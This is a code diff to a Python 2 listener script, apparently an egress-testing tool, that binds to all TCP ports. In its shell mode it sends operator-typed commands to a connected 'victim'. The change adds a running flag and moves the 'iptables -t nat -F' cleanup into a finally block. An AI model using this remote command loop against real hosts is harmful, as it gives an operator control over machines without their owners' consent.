@@ -15,6 +15,7 @@ import time
 # define empty variable
 shell = ""
 port = 1090
+running = True
 
 # assign arg params
 try:
@@ -53,7 +54,7 @@ class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):
         self.data = self.request.recv(1024).strip()
         print "[*] Connected from %s on port: TCP %s" % (self.client_address[0], self.data)
         if shell == "shell":
-            while 1:
+            while running:
                 request = raw_input("Enter the command to send to the victim: ")
                 if request != "":
                     self.request.sendall(request)
@@ -64,6 +65,7 @@ class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):
                         print self.data
                     except:
                         pass
+        return
 
 
 class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): pass
@@ -83,13 +85,16 @@ if __name__ == "__main__":
         socketserver_thread.start()
         print "[*] Listening on all TCP ports now... Press control-c when finished."
 
-        while 1:
-            try:
-                time.sleep(1)
+        while running:
+            time.sleep(1)
 
-            except KeyboardInterrupt:
-                print "\n[*] Exiting, flushing iptables to remove entries."
-                subprocess.Popen("iptables -t nat -F", shell=True).wait()
-                sys.exit()
+    except KeyboardInterrupt:
+        running = False
     except Exception, e:
         print "[!] An issue occurred. Error: " + str(e)
+    finally:
+        print "\n[*] Exiting, flushing iptables to remove entries."
+        subprocess.Popen("iptables -t nat -F", shell=True).wait()
+
+    print "[*] Done"
+    sys.exit()
